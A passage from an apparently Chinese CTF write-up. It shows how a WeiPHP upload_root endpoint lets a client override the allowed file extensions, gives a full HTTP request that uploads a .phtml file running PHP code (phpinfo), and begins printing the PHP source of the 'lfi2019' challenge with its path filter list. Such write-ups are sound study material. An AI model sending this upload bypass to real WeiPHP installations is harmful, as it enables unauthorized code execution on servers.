class="hljs-comment">/* 文件上传 到根目录 */</span></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_root</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">  $return = <span class="hljs-keyword">array</span>(</span><br><span class="line">    <span class="hljs-string">'status'</span> =&gt; <span class="hljs-number">1</span>,</span><br><span class="line">    <span class="hljs-string">'info'</span> =&gt; <span class="hljs-string">'上传成功'</span>,</span><br><span class="line">    <span class="hljs-string">'data'</span> =&gt; <span class="hljs-string">''</span></span><br><span class="line">  );</span><br><span class="line">  <span class="hljs-comment">/* 调用文件上传组件上传文件 */</span></span><br><span class="line">  $File = D(<span class="hljs-string">'home/File'</span>);</span><br><span class="line">  $file_driver = strtolower(config(<span class="hljs-string">'picture_upload_driver'</span>));</span><br><span class="line">  $setting = <span class="hljs-keyword">array</span> (</span><br><span class="line">    <span class="hljs-string">'rootPath'</span> =&gt; <span class="hljs-string">'./'</span> ,</span><br><span class="line">  );</span><br><span class="line">  $info = $File-&gt;upload($setting, config(<span class="hljs-string">'picture_upload_driver'</span>), config(<span class="hljs-string">"upload_{$file_driver}_config"</span>));</span><br><span class="line">  <span class="hljs-comment">//     $info = $File-&gt;upload(config('download_upload'), config('picture_upload_driver'), config("upload_{$file_driver}_config"));</span></span><br><span class="line">  <span class="hljs-comment">/* 记录附件信息 */</span></span><br><span class="line">  <span class="hljs-keyword">if</span> ($info) {</span><br><span class="line">    $return[<span class="hljs-string">'status'</span>] = <span class="hljs-number">1</span>;</span><br><span class="line">    $return = array_merge($info[<span class="hljs-string">'download'</span>], $return);</span><br><span class="line">  } <span class="hljs-keyword">else</span> {</span><br><span class="line">    $return[<span class="hljs-string">'status'</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    $return[<span class="hljs-string">'info'</span>] = $File-&gt;getError();</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-comment">/* 返回JSON数据 */</span></span><br><span class="line">  <span class="hljs-keyword">return</span> json_encode($return);</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>其中是调用了<code>application/home/model/File.php</code>中的一个<code>upload</code>函数</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span><span class="hljs-params">($setting = [], $driver = <span class="hljs-string">'Local'</span>, $config = null, $isTest = false)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">true...</span><br><span class="line">  $info = upload_files($setting, $driver, $config, <span class="hljs-string">'download'</span>, $isTest);</span><br><span class="line">  ...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这个函数又调用了<code>application/common.php</code>当中的<code>upload_files</code>函数，然后我们可以发现又这么一段神奇的代码：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ($type == <span class="hljs-string">'picture'</span>) {</span><br><span class="line">  <span class="hljs-comment">//图片扩展名验证 ，图片大小不超过20M</span></span><br><span class="line">  $checkRule[<span class="hljs-string">'ext'</span>] = <span class="hljs-string">'gif,jpg,jpeg,png,bmp'</span>;</span><br><span class="line">  $checkRule[<span class="hljs-string">'size'</span>] = <span class="hljs-number">20971520</span>;</span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">  $allowExt = input(<span class="hljs-string">'allow_file_ext'</span>, <span class="hljs-string">''</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span> ($allowExt != <span class="hljs-string">''</span>) {</span><br><span class="line">    $checkRule[<span class="hljs-string">'ext'</span>] = $allowExt;</span><br><span class="line">  }</span><br><span class="line">  $allowSize = input(<span class="hljs-string">'allow_file_maxsize'</span>, <span class="hljs-string">''</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span> ($allowSize &gt; <span class="hljs-number">0</span>) {</span><br><span class="line">    $checkRule[<span class="hljs-string">'size'</span>] = $allowSize;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里<code>input('allow_file_ext', '');</code>表示我们可以设置允许上传的类型…然后我们随便上传一个试试</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/weiphp/public/index.php/home/file/upload_root</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------6593480186465200061941970669</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 480</span><br><span class="line"><span class="hljs-attribute">Origin</span>: http://zedd.vv</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Referer</span>: http://zedd.vv/upload.html</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: PHPSESSID=0cfb281c78e25924ebb7c8abe9084590</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------6593480186465200061941970669</span><br><span class="line"><span class="hljs-attribute">Content-Disposition</span>: form-data; name="name"; filename="1.phtml"</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="hljs-attribute">phpinfo();?&gt;</span></span><br><span class="line"><span class="hljs-attribute">-----------------------------6593480186465200061941970669</span></span><br><span class="line"><span class="hljs-attribute">Content-Disposition</span>: form-data; name="allow_file_ext"</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">phtml</span></span><br><span class="line"><span class="hljs-attribute">-----------------------------6593480186465200061941970669</span></span><br><span class="line"><span class="hljs-attribute">Content-Disposition</span>: form-data; name="allow_file_maxsize"</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">1024</span></span><br><span class="line"><span class="hljs-attribute">-----------------------------6593480186465200061941970669--</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>虽然报错了但是我们依然上传成功了，直接访问那个路径即可。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109134834.png" alt=""></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109135000.png" alt=""></p><h2 id="lfi2019"><a href="#lfi2019" class="headerlink" title="lfi2019"></a>lfi2019</h2><p>在 header 头有一个提示可以拿到源码</p><p></p><figure class="highlight vim hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">X</span>-Hin<span class="hljs-variable">t:</span> /<span class="hljs-built_in">index</span>.php?show-<span class="hljs-keyword">me</span>-the-hint</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">        Developed by stypr.</span></span><br><span class="line"><span class="hljs-comment">        Made in 2018, Releasing in 2019!</span></span><br><span class="line"><span class="hljs-comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Baka flag-sama and seed-chan! //</span></span><br><span class="line">    error_reporting(<span class="hljs-number">0</span>);</span><br><span class="line">    ini_set(<span class="hljs-string">"display_errors"</span>,<span class="hljs-string">"off"</span>);</span><br><span class="line">    @<span class="hljs-keyword">require</span>(<span class="hljs-string">'flag.php'</span>);</span><br><span class="line">    $seed = md5(rand(PHP_INT_MIN,PHP_INT_MAX));</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span>($flag === $_GET[<span class="hljs-string">'trigger'</span>]){</span><br><span class="line">        <span class="hljs-keyword">die</span>(hash(<span class="hljs-string">"sha256"</span>, $seed . $flag));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Sessions are never used but we add that //</span></span><br><span class="line">    ini_set(<span class="hljs-string">'session.cookie_httponly'</span>, <span class="hljs-number">1</span>); @phpinfo();</span><br><span class="line">    ini_set(<span class="hljs-string">'session.cookie_secure'</span>, <span class="hljs-number">1</span>); @phpinfo();</span><br><span class="line">    ini_set(<span class="hljs-string">'session.use_only_cookies'</span>,<span class="hljs-number">1</span>); @phpinfo();</span><br><span class="line">    ini_set(<span class="hljs-string">'session.gc_probability'</span>, <span class="hljs-number">1</span>); @phpinfo();</span><br><span class="line">    <span class="hljs-comment">// but really, you can't really do something with sessions. //</span></span><br><span class="line">    session_save_path(<span class="hljs-string">'./sess/'</span>);</span><br><span class="line">    session_name(<span class="hljs-string">"lfi2019"</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    session_destroy();</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Flush directory for security purposes //</span></span><br><span class="line">    <span class="hljs-comment">// Referenced it from StackOverflow: https://bit.ly/2MxvxXE //</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rrmdir</span><span class="hljs-params">($dir, $depth=<span class="hljs-number">0</span>)</span></span>{ </span><br><span class="line">        <span class="hljs-keyword">if</span> (is_dir($dir)){</span><br><span class="line">            $objects = scandir($dir); </span><br><span class="line">            <span class="hljs-keyword">foreach</span> ($objects <span class="hljs-keyword">as</span> $object){ </span><br><span class="line">                <span class="hljs-keyword">if</span> ($object != <span class="hljs-string">"."</span> &amp;&amp; $object != <span class="hljs-string">".."</span>){ </span><br><span class="line">                    <span class="hljs-keyword">if</span>(is_dir($dir.<span class="hljs-string">"/"</span>.$object))</span><br><span class="line">                        rrmdir($dir.<span class="hljs-string">"/"</span>.$object, $depth + <span class="hljs-number">1</span>);</span><br><span class="line">                    <span class="hljs-keyword">else</span></span><br><span class="line">                        unlink($dir.<span class="hljs-string">"/"</span>.$object); </span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span>($depth != <span class="hljs-number">0</span>) rmdir($dir); </span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">countdir</span><span class="hljs-params">($dir)</span></span>{</span><br><span class="line">        <span class="hljs-keyword">if</span> (is_dir($dir)){</span><br><span class="line">            $objects = scandir($dir);</span><br><span class="line">            <span class="hljs-keyword">foreach</span> ($objects <span class="hljs-keyword">as</span> $object){ </span><br><span class="line">                <span class="hljs-keyword">if</span> ($object != <span class="hljs-string">"."</span> &amp;&amp; $object != <span class="hljs-string">".."</span>){ </span><br><span class="line">                    $count += <span class="hljs-number">1</span>;</span><br><span class="line">                    <span class="hljs-keyword">if</span>(is_dir($dir.<span class="hljs-string">"/"</span>.$object))</span><br><span class="line">                        $count += countdir($dir.<span class="hljs-string">"/"</span>.$object);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> $count;</span><br><span class="line">    }</span><br><span class="line">    var_dump(countdir(<span class="hljs-string">"./files"</span>));</span><br><span class="line">    <span class="hljs-keyword">if</span>(countdir(<span class="hljs-string">"./files/"</span>) &gt;= <span class="hljs-number">100</span>) @rrmdir(<span class="hljs-string">"./files/"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Here, kawaii path-san for you! //</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">path_sanitizer</span><span class="hljs-params">($dir, $harden=false)</span></span>{</span><br><span class="line">        $dir = (string)$dir;</span><br><span class="line">        $dir_len = strlen($dir);</span><br><span class="line">        <span class="hljs-comment">// Deny LFI/RFI/XSS //</span></span><br><span class="line">        $filter = [<span class="hljs-string">'.'</span>, <span class="hljs-string">'./'</span>, <span class="hljs-string">'~'</span>, <span class="hljs-string">'.\\'</span>, <span class="hljs-string">'#'</span>, <span class="hljs-string">'&lt;'</span>, <span class="hljs-string">'&gt;'</span>];</span><br><span class="line">        <span class="hljs-keyword">foreach</span>($filter <span class="hljs-keyword">as</span> 